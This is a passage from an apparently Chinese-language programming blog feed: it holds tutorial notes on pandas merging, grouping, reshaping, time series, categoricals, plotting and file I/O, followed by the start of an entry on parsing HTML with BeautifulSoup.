-0.616352  0.160981  1.059860 -0.521867           0         1         2         30  1.434680 -0.776149 -1.218836  2.3971181 -1.632868 -0.806080  0.634619 -0.7609582  1.028005 -0.020240  0.696301  0.0906923 -1.516807  0.952234  0.758215 -0.2724094  0.540413  0.258468 -0.563238 -1.3808255  0.021616  0.097505 -1.052843  0.2728926 -0.957512  0.088345 -0.972309 -1.2245227  0.211805  1.674883 -0.919839 -0.1598928  1.651509  0.908129 -0.416815 -0.6290149 -0.616352  0.160981  1.059860 -0.521867</code></pre><h2 id="52-join"><a class="markdownIt-Anchor" href="#52-join"></a> 5.2 Join</h2><ul><li>SQL样式的合并方法</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">left = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'foo'</span>, <span class="string">'foo'</span>], <span class="string">'lval'</span>: [<span class="number">1</span>, <span class="number">2</span>]&#125;)</span><br><span class="line">right = pd.DataFrame(&#123;<span class="string">'key'</span>: [<span class="string">'foo'</span>, <span class="string">'foo'</span>], <span class="string">'rval'</span>: [<span class="number">4</span>, <span class="number">5</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> (left, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (right, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (pd.merge(left, right, on=<span class="string">'key'</span>))</span><br></pre></td></tr></table></figure><pre><code>   key  lval0  foo     11  foo     2    key  rval0  foo     41  foo     5    key  lval  rval0  foo     1     41  foo     1     52  foo     2     43  foo     2     5</code></pre><h2 id="53-append"><a class="markdownIt-Anchor" href="#53-append"></a> 5.3 Append</h2><ul><li>合并行为DataFrame</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">8</span>,<span class="number">4</span>), columns=[<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>])</span><br><span class="line"><span class="keyword">print</span> (df, <span class="string">'\n'</span>)</span><br><span class="line">s =df.iloc[<span class="number">3</span>]</span><br><span class="line"><span class="keyword">print</span> (df.append(s, ignore_index=<span class="literal">True</span>))</span><br></pre></td></tr></table></figure><pre><code>          A         B         C         D0  0.481732  1.270100  0.518214  0.0283051  0.004151  0.602318  1.274942 -2.6831022  0.130687 -0.402626  0.701901 -1.1825793 -1.047072  0.656017  0.468616 -0.6948424 -0.097726  1.669621  0.901135  1.3376485  0.493724 -0.865273 -1.390465  1.1431486 -0.691091  0.460376  0.540177 -0.2053317 -0.634427  2.625610  0.067031 -2.041728           A         B         C         D0  0.481732  1.270100  0.518214  0.0283051  0.004151  0.602318  1.274942 -2.6831022  0.130687 -0.402626  0.701901 -1.1825793 -1.047072  0.656017  0.468616 -0.6948424 -0.097726  1.669621  0.901135  1.3376485  0.493724 -0.865273 -1.390465  1.1431486 -0.691091  0.460376  0.540177 -0.2053317 -0.634427  2.625610  0.067031 -2.0417288 -1.047072  0.656017  0.468616 -0.694842</code></pre><h1 id="6-grouping"><a class="markdownIt-Anchor" href="#6-grouping"></a> 6 Grouping</h1><p>与SQL中的group by类似，包含以下步骤：</p><ul><li>根据规则将数据分组</li><li>将函数独立的应用到每个分组</li><li>将结果合并</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'A'</span>: [<span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>,<span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'foo'</span>, <span class="string">'foo'</span>],</span><br><span class="line">                   <span class="string">'B'</span>: [<span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>,<span class="string">'two'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'three'</span>],</span><br><span class="line">                   <span class="string">'C'</span>: np.random.randn(<span class="number">8</span>),</span><br><span class="line">                   <span class="string">'D'</span>: np.random.randn(<span class="number">8</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> (df, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.groupby(<span class="string">'A'</span>).sum(), <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (df.groupby([<span class="string">'A'</span>, <span class="string">'B'</span>]).sum())</span><br></pre></td></tr></table></figure><pre><code>     A      B         C         D0  foo    one  0.182951 -0.3460161  bar    one  1.906573 -0.3869022  foo    two  0.102443 -1.0870783  bar  three  1.023196  0.4672374  foo    two -0.940578 -0.4149475  bar    two -1.075379 -0.8444416  foo    one  0.514689  0.0383937  foo  three -2.136912 -1.001738             C         DA                      bar  1.854390 -0.764105foo -2.277406 -2.811385                   C         DA   B                        bar one    1.906573 -0.386902    three  1.023196  0.467237    two   -1.075379 -0.844441foo one    0.697640 -0.307622    three -2.136912 -1.001738    two   -0.838134 -1.502025</code></pre><h1 id="7-reshaping"><a class="markdownIt-Anchor" href="#7-reshaping"></a> 7 Reshaping</h1><h2 id="71-stack层叠"><a class="markdownIt-Anchor" href="#71-stack层叠"></a> 7.1 Stack层叠</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuples = list(zip(*[[<span class="string">'bar'</span>, <span class="string">'bar'</span>, <span class="string">'baz'</span>, <span class="string">'baz'</span>, <span class="string">'foo'</span>, <span class="string">'foo'</span>, <span class="string">'qux'</span>, <span class="string">'qux'</span>],</span><br><span class="line">                     [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>]]))</span><br><span class="line"><span class="keyword">print</span> (tuples)</span><br><span class="line">index = pd.MultiIndex.from_tuples(tuples, names=[<span class="string">'first'</span>, <span class="string">'second'</span>])</span><br><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">8</span>, <span class="number">2</span>), index=index, columns=[<span class="string">'A'</span>, <span class="string">'B'</span>])</span><br><span class="line">df2 = df[:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">print</span> (df2, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>[('bar', 'one'), ('bar', 'two'), ('baz', 'one'), ('baz', 'two'), ('foo', 'one'), ('foo', 'two'), ('qux', 'one'), ('qux', 'two')]                     A         Bfirst second                    bar   one     0.220077  1.659987      two    -1.504953  0.350697baz   one     1.631244  0.637820      two    -0.083256  0.370784 </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">stacked = df2.stack()</span><br><span class="line"><span class="keyword">print</span> (stacked, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(stacked.unstack(), <span class="string">'\n'</span>)</span><br><span class="line">print(stacked.unstack(<span class="number">0</span>), <span class="string">'\n'</span>)</span><br><span class="line">print(stacked.unstack(<span class="number">1</span>), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>first  second   bar    one     A    0.220077               B    1.659987       two     A   -1.504953               B    0.350697baz    one     A    1.631244               B    0.637820       two     A   -0.083256               B    0.370784dtype: float64                      A         Bfirst second                    bar   one     0.220077  1.659987      two    -1.504953  0.350697baz   one     1.631244  0.637820      two    -0.083256  0.370784 first          bar       bazsecond                      one    A  0.220077  1.631244       B  1.659987  0.637820two    A -1.504953 -0.083256       B  0.350697  0.370784 second        one       twofirst                      bar   A  0.220077 -1.504953      B  1.659987  0.350697baz   A  1.631244 -0.083256      B  0.637820  0.370784 </code></pre><p>​</p><h2 id="72-pivot-tables"><a class="markdownIt-Anchor" href="#72-pivot-tables"></a> 7.2 Pivot tables</h2><ul><li>pivot是把指定索引所对应的内容，作为新表的行(index)、列(columns)</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'A'</span>: [<span class="string">'one'</span>, <span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>] * <span class="number">3</span>,</span><br><span class="line">                   <span class="string">'B'</span>: [<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>] * <span class="number">4</span>,</span><br><span class="line">                   <span class="string">'C'</span>: [<span class="string">'foo'</span>, <span class="string">'foo'</span>, <span class="string">'foo'</span>, <span class="string">'bar'</span>, <span class="string">'bar'</span>, <span class="string">'bar'</span>] * <span class="number">2</span>,</span><br><span class="line">                   <span class="string">'D'</span>: np.random.randn(<span class="number">12</span>),</span><br><span class="line">                   <span class="string">'E'</span>: np.random.randn(<span class="number">12</span>)&#125;)</span><br><span class="line"><span class="keyword">print</span> (df, <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (pd.pivot_table(df, values=<span class="string">'D'</span>, index=[<span class="string">'A'</span>, <span class="string">'B'</span>], columns=[<span class="string">'C'</span>]), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>        A  B    C         D         E0     one  A  foo -0.647116 -0.3837971     one  B  foo -1.009740 -0.1499292     two  C  foo -0.000333  0.2335503   three  A  bar  0.308752 -0.2048584     one  B  bar  0.157966 -0.0667075     one  C  bar  1.028976 -1.6974996     two  A  foo -0.170791 -0.1610747   three  B  foo  1.222346 -0.4653358     one  C  foo -0.024742 -1.9846979     one  A  bar -1.253050  0.67534510    two  B  bar -0.124737 -0.16924311  three  C  bar  0.501580  1.049995 C             bar       fooA     B                    one   A -1.253050 -0.647116      B  0.157966 -1.009740      C  1.028976 -0.024742three A  0.308752       NaN      B       NaN  1.222346      C  0.501580       NaNtwo   A       NaN -0.170791      B -0.124737       NaN      C       NaN -0.000333 </code></pre><p>​</p><h1 id="8-time-series"><a class="markdownIt-Anchor" href="#8-time-series"></a> 8 Time series</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rng = pd.date_range(<span class="string">'1/1/2020'</span>, periods=<span class="number">120</span>, freq=<span class="string">'S'</span>)</span><br><span class="line">ts = pd.Series(np.random.randint(<span class="number">0</span>, <span class="number">500</span>, len(rng)), index=rng)</span><br><span class="line"><span class="keyword">print</span> (ts, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (ts.resample(<span class="string">'1Min'</span>).sum())  <span class="comment">#resapmle重采样，每隔一分钟为index，对值进行求和</span></span><br></pre></td></tr></table></figure><pre><code>2020-01-01 00:00:00    3492020-01-01 00:00:01    1412020-01-01 00:00:02    4672020-01-01 00:00:03    1522020-01-01 00:00:04    491                      ... 2020-01-01 00:01:55     292020-01-01 00:01:56    3832020-01-01 00:01:57    3102020-01-01 00:01:58    2042020-01-01 00:01:59    115Freq: S, Length: 120, dtype: int32 2020-01-01 00:00:00    154902020-01-01 00:01:00    13744Freq: T, dtype: int32</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 时区表示</span></span><br><span class="line">rng = pd.date_range(<span class="string">'3/6/2020 00:00'</span>, periods=<span class="number">5</span>, freq=<span class="string">'D'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(len(rng)), rng)</span><br><span class="line"><span class="keyword">print</span> (ts, <span class="string">'\n'</span>)</span><br><span class="line">ts_utc = ts.tz_localize(<span class="string">'UTC'</span>)</span><br><span class="line"><span class="keyword">print</span> (ts_utc, <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>2020-03-06   -0.2647622020-03-07    1.3586512020-03-08   -0.3168102020-03-09   -0.1342252020-03-10   -0.960168Freq: D, dtype: float64 2020-03-06 00:00:00+00:00   -0.2647622020-03-07 00:00:00+00:00    1.3586512020-03-08 00:00:00+00:00   -0.3168102020-03-09 00:00:00+00:00   -0.1342252020-03-10 00:00:00+00:00   -0.960168Freq: D, dtype: float64 </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#转换为另一个时区</span></span><br><span class="line"><span class="keyword">print</span> (ts_utc.tz_convert(<span class="string">'US/Eastern'</span>), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>2020-03-05 19:00:00-05:00   -0.2647622020-03-06 19:00:00-05:00    1.3586512020-03-07 19:00:00-05:00   -0.3168102020-03-08 20:00:00-04:00   -0.1342252020-03-09 20:00:00-04:00   -0.960168Freq: D, dtype: float64 </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在时间跨度的表示之间进行转换</span></span><br><span class="line">rng = pd.date_range(<span class="string">'1/1/2020'</span>, periods=<span class="number">5</span>, freq=<span class="string">'M'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(len(rng)), index=rng)</span><br><span class="line"><span class="keyword">print</span> (ts, <span class="string">'\n'</span>)</span><br><span class="line">ps = ts.to_period()</span><br><span class="line"><span class="keyword">print</span> (ps, <span class="string">'\n'</span>)</span><br><span class="line"><span class="keyword">print</span> (ps.to_timestamp(),<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>2020-01-31   -0.3259682020-02-29   -0.9891232020-03-31   -0.3235222020-04-30    0.4917922020-05-31   -0.161315Freq: M, dtype: float64 2020-01   -0.3259682020-02   -0.9891232020-03   -0.3235222020-04    0.4917922020-05   -0.161315Freq: M, dtype: float64 2020-01-01   -0.3259682020-02-01   -0.9891232020-03-01   -0.3235222020-04-01    0.4917922020-05-01   -0.161315Freq: MS, dtype: float64 </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#在period和timestamp之间进行转换可以使用一些方便的算术函数:</span></span><br><span class="line">prng = pd.period_range(<span class="string">'1990Q1'</span>, <span class="string">'2000Q4'</span>, freq=<span class="string">'Q-NOV'</span>)</span><br><span class="line">ts = pd.Series(np.random.randn(len(prng)), prng)</span><br><span class="line"><span class="keyword">print</span> (ts[:<span class="number">6</span>], <span class="string">'\n'</span>)</span><br><span class="line">ts.index = (prng.asfreq(<span class="string">'M'</span>, <span class="string">'e'</span>) + <span class="number">1</span>).asfreq(<span class="string">'H'</span>, <span class="string">'s'</span>) + <span class="number">9</span></span><br><span class="line"><span class="keyword">print</span> (ts.head(), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>1990Q1   -0.6948471990Q2    1.1231051990Q3    0.3952931990Q4   -0.5179521991Q1    0.6893731991Q2    0.664599Freq: Q-NOV, dtype: float64 1990-03-01 09:00   -0.6948471990-06-01 09:00    1.1231051990-09-01 09:00    0.3952931990-12-01 09:00   -0.5179521991-03-01 09:00    0.689373Freq: H, dtype: float64 </code></pre><p>​</p><h1 id="9-categoricals"><a class="markdownIt-Anchor" href="#9-categoricals"></a> 9 Categoricals</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">"id"</span>: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">            <span class="string">"raw_grade"</span>: [<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'b'</span>, <span class="string">'a'</span>, <span class="string">'a'</span>, <span class="string">'e'</span>]&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">#将raw_grade转化为categorical的数据类型</span></span><br><span class="line">df[<span class="string">"grade"</span>] = df[<span class="string">"raw_grade"</span>].astype(<span class="string">"category"</span>)</span><br><span class="line"><span class="keyword">print</span> (df[<span class="string">"grade"</span>], <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>0    a1    b2    b3    a4    a5    eName: grade, dtype: categoryCategories (3, object): [a, b, e] </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df[<span class="string">"grade"</span>].cat.categories = [<span class="string">"very good"</span>, <span class="string">"good"</span>, <span class="string">"very bad"</span>]</span><br><span class="line"><span class="keyword">print</span> (df[<span class="string">"grade"</span>], <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#重新排序类别，同时添加缺少的类别;新类别按照旧类别的顺序匹配</span></span><br><span class="line">df[<span class="string">"grade"</span>] = df[<span class="string">"grade"</span>].cat.set_categories([<span class="string">"very bad"</span>, <span class="string">"bad"</span>, <span class="string">"medium"</span>, <span class="string">"good"</span>, <span class="string">"very good"</span>])</span><br><span class="line"><span class="keyword">print</span> (df[<span class="string">"grade"</span>], <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (3, object): [very good, good, very bad] 0    very good1         good2         good3    very good4    very good5     very badName: grade, dtype: categoryCategories (5, object): [very bad, bad, medium, good, very good] </code></pre><p>​</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#排序是按类别中的顺序进行的，而不是词汇顺序。</span></span><br><span class="line"><span class="keyword">print</span> (df.sort_values(by=<span class="string">"grade"</span>), <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (df.groupby(<span class="string">"grade"</span>).size())</span><br></pre></td></tr></table></figure><pre><code>   id raw_grade      grade5   6         e   very bad1   2         b       good2   3         b       good0   1         a  very good3   4         a  very good4   5         a  very good gradevery bad     1bad          0medium       0good         2very good    3dtype: int64</code></pre><h1 id="10-plotting"><a class="markdownIt-Anchor" href="#10-plotting"></a> 10 Plotting</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts = pd.Series(np.random.randn(<span class="number">1000</span>),index=pd.date_range(<span class="string">'1/1/2020'</span>, periods=<span class="number">1000</span>))</span><br><span class="line">ts = ts.cumsum()</span><br><span class="line">ts.plot()</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191216114300557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-lGmpFdQv-1576467757700)(output_66_1.png)]" /></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">df = pd.DataFrame(np.random.randn(<span class="number">1000</span>, <span class="number">4</span>), index=ts.index,columns=[<span class="string">'A'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'D'</span>])</span><br><span class="line">df = df.cumsum()</span><br><span class="line">plt.figure()</span><br><span class="line">df.plot()</span><br><span class="line">plt.legend(loc=<span class="string">'best'</span>) <span class="comment">#best表示自动分配最佳位置</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20191216114323780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70#pic_center" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-h0f9J79v-1576467757701)(output_67_2.png)]" /></p><h1 id="11-读取-写入数据"><a class="markdownIt-Anchor" href="#11-读取-写入数据"></a> 11 读取、写入数据</h1><h2 id="111-csv"><a class="markdownIt-Anchor" href="#111-csv"></a> 11.1 CSV</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入</span></span><br><span class="line">df.to_csv(<span class="string">'foo.csv'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取</span></span><br><span class="line"><span class="keyword">print</span> (pd.read_csv(<span class="string">'foo.csv'</span>), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>     Unnamed: 0          A          B          C          D0    2020-01-01   0.674980   0.021207  -0.984289  -0.2614621    2020-01-02   2.434732   0.361986   1.523058  -0.4289132    2020-01-03   4.390606   0.680106   0.511064  -0.7223903    2020-01-04   4.721387   0.118680   0.446910  -0.7889974    2020-01-05   5.966886  -1.940727   1.120733  -0.169760..          ...        ...        ...        ...        ...995  2022-09-22   9.467967   9.121625  57.829448  31.631881996  2022-09-23   8.552319  10.117774  56.513708  30.713588997  2022-09-24  10.064727   9.115677  56.434259  32.638695998  2022-09-25   9.974457   7.912468  56.121923  32.281864999  2022-09-26   8.935891   8.412897  58.160465  32.012264[1000 rows x 5 columns] </code></pre><p>​</p><h2 id="112-hdf5"><a class="markdownIt-Anchor" href="#112-hdf5"></a> 11.2 HDF5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入</span></span><br><span class="line">df.to_hdf(<span class="string">'foo.h5'</span>, <span class="string">'df'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取</span></span><br><span class="line"><span class="keyword">print</span> (pd.read_hdf(<span class="string">'foo.h5'</span>, <span class="string">'df'</span>), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>                    A          B          C          D2020-01-01   0.674980   0.021207  -0.984289  -0.2614622020-01-02   2.434732   0.361986   1.523058  -0.4289132020-01-03   4.390606   0.680106   0.511064  -0.7223902020-01-04   4.721387   0.118680   0.446910  -0.7889972020-01-05   5.966886  -1.940727   1.120733  -0.169760...               ...        ...        ...        ...2022-09-22   9.467967   9.121625  57.829448  31.6318812022-09-23   8.552319  10.117774  56.513708  30.7135882022-09-24  10.064727   9.115677  56.434259  32.6386952022-09-25   9.974457   7.912468  56.121923  32.2818642022-09-26   8.935891   8.412897  58.160465  32.012264[1000 rows x 4 columns] </code></pre><p>​</p><h2 id="113-excel"><a class="markdownIt-Anchor" href="#113-excel"></a> 11.3 Excel</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#写入</span></span><br><span class="line">df.to_excel(<span class="string">'foo.xlsx'</span>, sheet_name=<span class="string">'Sheet1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取</span></span><br><span class="line"><span class="keyword">print</span> (pd.read_excel(<span class="string">'foo.xlsx'</span>, <span class="string">'Sheet1'</span>, index_col=<span class="literal">None</span>, na_values=[<span class="string">'NA'</span>]), <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><pre><code>    Unnamed: 0          A          B          C          D0   2020-01-01   0.674980   0.021207  -0.984289  -0.2614621   2020-01-02   2.434732   0.361986   1.523058  -0.4289132   2020-01-03   4.390606   0.680106   0.511064  -0.7223903   2020-01-04   4.721387   0.118680   0.446910  -0.7889974   2020-01-05   5.966886  -1.940727   1.120733  -0.169760..         ...        ...        ...        ...        ...995 2022-09-22   9.467967   9.121625  57.829448  31.631881996 2022-09-23   8.552319  10.117774  56.513708  30.713588997 2022-09-24  10.064727   9.115677  56.434259  32.638695998 2022-09-25   9.974457   7.912468  56.121923  32.281864999 2022-09-26   8.935891   8.412897  58.160465  32.012264[1000 rows x 5 columns] </code></pre><p>​</p><h1 id="12-注意"><a class="markdownIt-Anchor" href="#12-注意"></a> 12 注意</h1><ul><li>不能直接把返回值当作布尔值：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> pd.Series([<span class="literal">False</span>, <span class="literal">True</span>, <span class="literal">False</span>]):</span><br><span class="line">    print(<span class="string">"I was true"</span>)</span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------   ValueError                                Traceback (most recent call last)&lt;ipython-input-210-5c782b38cd2f&gt; in &lt;module&gt;----&gt; 1 if pd.Series([False, True, False]):      2     print(&quot;I was true&quot;)   D:\Applications\Anaconda3\lib\site-packages\pandas\core\generic.py in __nonzero__(self)   1553             &quot;The truth value of a {0} is ambiguous. &quot;   1554             &quot;Use a.empty, a.bool(), a.item(), a.any() or a.all().&quot;.format(-&gt; 1555                 self.__class__.__name__   1556             )   1557         )ValueError: The truth value of a Series is ambiguous. Use a.empty, a.bool(), a.item(), a.any() or a.all().</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python3爬虫笔记-解析库BeautifulSoup</title>
      <link href="/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E8%A7%A3%E6%9E%90%E5%BA%93BeautifulSoup/"/>
      <url>/2020/02/21/Python3%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0-%E8%A7%A3%E6%9E%90%E5%BA%93BeautifulSoup/</url>
      
        <content type="html"><![CDATA[<h1 id="1-简介"><a class="markdownIt-Anchor" href="#1-简介"></a> 1 简介</h1><ul><li><kbd>Beautiful Soup</kbd>：Python的一个HTML或XML的解析库，借助网页的结构和属性等特性来解析网页。有了它，我们不用再去写一些复杂的正则表达式，只需要简单的几条语句，就可以完成网页中某个元素的提取。</li><li>Beautiful Soup在解析时实际上依赖解析器，这里推荐使用<kbd>lxml</kbd>解析器，在初始化Beautiful Soup时，把第二个参数改为lxml即可：</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">'&lt;p&gt;Hello&lt;/p&gt;'</span>, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.p.string)</span><br></pre></td></tr></table></figure><h1 id="2-基本用法"><a class="markdownIt-Anchor" href="#2-基本用法"></a> 2 基本用法</h1><ul><li>初始化BeautifulSoup时，完成对不完整的html代码的补全</li><li><kbd>prettify()</kbd>：把要解析的字符串以标准的缩进格式输出</li><li><kbd>soup.title.string</kbd>：是输出HTML中title节点的文本内容；soup.title会输出整个title节点</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">html = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class="line"><span class="string">&lt;a href="http://example.com/elsie" class="sister" id="link1"&gt;&lt;!-- Elsie --&gt;&lt;/a&gt;,</span></span><br><span class="line"><span class="string">&lt;a href="http://example.com/lacie" class="sister" id="link2"&gt;Lacie&lt;/a&gt; and</span></span><br><span class="line"><span class="string">&lt;a href="http://example.com/tillie" class="sister" id="link3"&gt;Tillie&lt;/a&gt;;</span></span><br><span class="line"><span class="string">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class="story"&gt;...&lt;/p&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line">print(soup.prettify())</span><br><span class="line">print(soup.title.string)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#输出结果：</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;</span><br><span class="line">   The Dormouse<span class="string">'s story</span></span><br><span class="line"><span class="string">  &lt;/title&gt;</span></span><br><span class="line"><span class="string"> &lt;/head&gt;</span></span><br><span class="line"><span class="string"> &lt;body&gt;</span></span><br><span class="line"><span class="string">  &lt;p class="title" name="dromouse"&gt;</span></span><br><span class="line"><span class="string">   &lt;b&gt;</span></span><br><span class="line"><span class="string">    The Dormouse'</span>s story</span><br><span class="line">   &lt;/b&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   Once upon a time there were three little sisters; <span class="keyword">and</span> their names were</span><br><span class="line">   &lt;a class="sister" href="http://example.com/elsie" id="link1"&gt;</span><br><span class="line">    &lt;!-- Elsie --&gt;</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ,</span><br><span class="line">   &lt;a class="sister" href="http://example.com/lacie" id="link2"&gt;</span><br><span class="line">    Lacie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   <span class="keyword">and</span></span><br><span class="line">   &lt;a class="sister" href="http://example.com/tillie" id="link3"&gt;</span><br><span class="line">    Tillie</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   ;</span><br><span class="line"><span class="keyword">and</span> they lived at the bottom of a well.</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class="story"&gt;</span><br><span class="line">   ...</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">The Dormouse<span class="string">'s story</span></span><br></pre></td></tr></table></figure><h1 id="3-节点选择器"><a class="markdownIt-Anchor" href="#3-节点选择器"></a> 3 节点选择器</h1><ul><li>直接调用节点的名称就可以选择节点元素，再调用string属性就可以得到节点内的文本了，这种选择方式速度非常快。如果单个节点结构层次非常清晰，可以选用这种方式来解析</li></ul><h2 id="31-选择元素"><a class="markdownIt-Anchor" href="#31-选择元素"></a> 3.1 选择元素</h2><ul><li>当有多个节点时，这种选择方式只会选择到第一个匹配的节点，其他的后面节点都会忽略，如下例中的p节点。</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line">html = <span class="string">"""</span></span><br><span class="line"><span class="string">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse's story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">&lt;p class="title" name="dromouse"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;p class="story"&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span 